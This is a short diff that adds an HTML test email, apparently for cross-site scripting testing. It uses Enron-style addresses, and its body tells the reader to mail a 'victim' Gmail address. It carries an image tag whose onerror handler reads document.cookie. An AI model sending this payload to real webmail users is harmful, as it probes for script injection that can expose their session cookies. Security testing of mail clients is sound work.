@@ -1,0 +1,7 @@
+From: grantoregonrains@hotmail.com
+To: mike.grigsby@enron.com, mike.grigsby@enron.com, tori.kuykendall@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
